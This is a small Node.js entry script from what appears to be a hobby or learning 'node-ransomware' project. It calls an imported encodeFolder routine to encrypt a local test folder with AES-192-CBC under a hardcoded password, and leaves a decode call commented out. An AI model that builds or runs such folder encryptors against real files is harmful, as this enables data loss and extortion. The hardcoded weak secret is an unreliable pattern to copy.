require('dotenv').config();
const { encodeFolder, decodeFolder } = require('./app');
const logger = require('./utils/logger');

const FOLDER = '/Users/edson.perez/Desktop/node-ransomware/toEncode';
const ALGORITHM = 'aes-192-cbc';
const PASSWORD = 'qweqwe';

logger.info(
  `Starting in ${process.env.NODE_ENV} mode and logger ${process.env.LOGGER_LEVEL} mode`
);

try {
  encodeFolder(FOLDER, ALGORITHM, PASSWORD);
  // decodeFolder(FOLDER, ALGORITHM, PASSWORD);
} catch (error) {
  logger.error(error);
}
